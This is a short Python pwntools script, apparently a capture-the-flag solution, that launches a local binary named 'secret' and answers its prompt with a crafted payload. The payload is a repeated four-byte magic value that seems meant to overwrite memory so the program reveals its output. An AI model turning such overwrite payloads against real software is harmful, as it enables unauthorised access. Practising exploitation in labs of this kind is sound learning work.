from pwn import *

io = process('./secret')

io.recvuntil('Tell me a secret')
io.sendline('\xdd\xcc\xbb\xaa'*2)

print io.recvline()
print io.recvline()
print io.recvline()
print io.recvline()
